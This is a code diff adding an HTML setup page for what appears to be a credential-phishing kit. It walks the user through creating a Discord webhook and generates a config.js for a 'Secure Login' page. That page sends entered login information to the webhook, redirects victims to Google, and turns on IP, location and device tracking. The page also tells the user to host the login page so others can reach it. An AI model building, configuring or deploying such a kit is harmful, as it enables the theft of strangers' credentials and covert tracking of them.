@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Webhook Setup</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        h1, h2, h3 {
+            color: #5865F2; /* Discord blue */
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .step {
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        .step:last-child {
+            border-bottom: none;
+        }
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background-color: #5865F2;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            margin-right: 10px;
+        }
+        code {
+            background-color: #f0f0f0;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: Consolas, Monaco, 'Andale Mono', monospace;
+        }
+        .code-block {
+            background-color: #2f3136; /* Discord dark */
+            color: #dcddde;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: Consolas, Monaco, 'Andale Mono', monospace;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        button {
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #4752c4;
+        }
+        .success {
+            background-color: #57F287;
+            color: white;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            display: none;
+        }
+        .image-container {
+            margin: 15px 0;
+            text-align: center;
+        }
+        .image-container img {
+            max-width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .note {
+            background-color: #FEE75C;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Discord Webhook Setup Guide</h1>
+        <p>This guide will help you set up a Discord webhook for your login page. Follow these steps to get your webhook URL and configure your login page.</p>
+        
+        <div class="step">
+            <h2><span class="step-number">1</span> Create a Discord Webhook</h2>
+            <p>First, you need to create a webhook in your Discord server:</p>
+            <ol>
+                <li>Open Discord and go to the server where you want to receive login notifications</li>
+                <li>Right-click on a text channel and select "Edit Channel"</li>
+                <li>Go to "Integrations" > "Webhooks" > "New Webhook"</li>
+                <li>Give your webhook a name (e.g., "Login Notifier") and optionally set an avatar</li>
+                <li>Click "Copy Webhook URL" to copy the webhook URL</li>
+                <li>Click "Save" to create the webhook</li>
+            </ol>
+            <div class="note">
+                <strong>Note:</strong> You must have the "Manage Webhooks" permission in the Discord server to create webhooks.
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2><span class="step-number">2</span> Configure Your Login Page</h2>
+            <p>Now, enter your Discord webhook URL below to automatically update your configuration:</p>
+            
+            <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." />
+            <button onclick="updateConfig()">Update Configuration</button>
+            
+            <div id="success" class="success">
+                Configuration updated successfully! Your login page is now ready to use.
+            </div>
+            
+            <div class="code-block" id="configCode">
+                // Configuration will appear here after you enter your webhook URL
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2><span class="step-number">3</span> Test Your Login Page</h2>
+            <p>After configuring your webhook URL:</p>
+            <ol>
+                <li>Open the <code>index.html</code> file in your web browser</li>
+                <li>Enter test credentials in the login form</li>
+                <li>Click the "Login" button</li>
+                <li>Check your Discord channel to see if the login information was received</li>
+            </ol>
+        </div>
+        
+        <div class="step">
+            <h2><span class="step-number">4</span> Deploy Your Login Page</h2>
+            <p>To make your login page accessible to others, you need to host it online. Here are some options:</p>
+            
+            <h3>Option 1: Use the included Node.js server</h3>
+            <ol>
+                <li>Make sure Node.js is installed on your computer</li>
+                <li>Double-click the <code>start-server.bat</code> file</li>
+                <li>Your login page will be available at <code>http://localhost:3000</code></li>
+            </ol>
+            
+            <h3>Option 2: Use a web hosting service</h3>
+            <ol>
+                <li>Sign up for a web hosting service (many offer free plans)</li>
+                <li>Upload all the files to your web hosting service</li>
+                <li>Your login page will be available at the URL provided by your hosting service</li>
+            </ol>
+        </div>
+    </div>
+    
+    <script>
+        function updateConfig() {
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            
+            if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                alert('Please enter a valid Discord webhook URL');
+                return;
+            }
+            
+            // Update the config.js file content
+            const configContent = `// Configuration file for the login page
+// Last updated: ${new Date().toLocaleString()}
+
+const CONFIG = {
+    // Your Discord webhook URL
+    DISCORD_WEBHOOK_URL: '${webhookUrl}',
+    
+    // The page to redirect to after login (optional)
+    REDIRECT_URL: 'https://www.google.com',
+    
+    // Delay before redirect in milliseconds (2000 = 2 seconds)
+    REDIRECT_DELAY: 2000,
+    
+    // Customize page appearance (optional)
+    PAGE_TITLE: 'Secure Login',
+    LOGO_ICON: 'fas fa-lock', // Font Awesome icon class
+    PRIMARY_COLOR: '#764ba2', // Main color theme
+    
+    // Enable or disable features
+    ENABLE_IP_TRACKING: true,
+    ENABLE_LOCATION_TRACKING: true,
+    ENABLE_DEVICE_INFO: true
+};
+`;
+            
+            // Display the config in the code block
+            document.getElementById('configCode').textContent = configContent;
+            
+            // Try to write to the config.js file
+            try {
+                // Create a Blob with the content
+                const blob = new Blob([configContent], { type: 'text/javascript' });
+                
+                // Create a download link
+                const downloadLink = document.createElement('a');
+                downloadLink.href = URL.createObjectURL(blob);
+                downloadLink.download = 'config.js';
+                
+                // Trigger the download
+                downloadLink.click();
+                
+                // Show success message
+                document.getElementById('success').style.display = 'block';
+                
+                // Provide instructions
+                setTimeout(() => {
+                    alert('A new config.js file has been downloaded. Please replace the existing config.js file with this new one.');
+                }, 500);
+                
+            } catch (error) {
+                console.error('Error creating config file:', error);
+                alert('Could not create config file automatically. Please manually copy the configuration code and paste it into your config.js file.');
+            }
+        }
+    </script>
+</body>
+</html>
